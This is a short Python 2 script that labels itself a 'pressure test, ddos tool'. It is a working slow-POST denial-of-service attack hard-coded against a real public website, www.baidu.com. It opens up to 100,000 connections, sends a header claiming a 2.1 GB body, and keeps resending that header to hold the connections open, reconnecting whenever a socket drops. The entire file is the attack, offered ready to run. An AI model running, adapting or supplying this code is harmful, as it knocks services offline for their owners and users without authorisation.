#!/usr/bin/env python
import socket
import time
import threading
import multiprocessing
# Pressure Test,ddos tool
# ---------------------------
MAX_CONN = 100000
PORT = 80
HOST = "www.baidu.com"
PAGE = "/overview.html"
thread_num = 2
# ---------------------------

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 2100000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []


def add_one_conn():
    global socks
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        s.send(buf)
        print "[+] Connect Send buf +1 OK!%s \n" % s
        socks.append(s)
    except Exception, ex:
        print "[-] Could not +1 connect to server or send error conn num:%s " % ex
        time.sleep(2)
        add_one_conn()


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            print "[+] Connect Send buf OK!,conn=%d\n" % i
            socks.append(s)
        except Exception, ex:
            print "[-] Could not connect to server or send error conn num:%d " % i
            time.sleep(2)
            add_one_conn()
# end def


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(buf)
                # print "[+] send fuck OK!%s" % s
            except Exception, ex:
                # print "[-] send fuck Exception:%s\n" % s
                socks.remove(s)
                s.close()
                add_one_conn()
        time.sleep(1)
# end def


def multi_thread_dos():
    for i in range(0, thread_num):
        conn_th = threading.Thread(target=conn_thread, args=())
        conn_th.start()
        send_th = threading.Thread(target=send_thread, args=())
        send_th.start()

if __name__ == '__main__':
    multi_thread_dos()
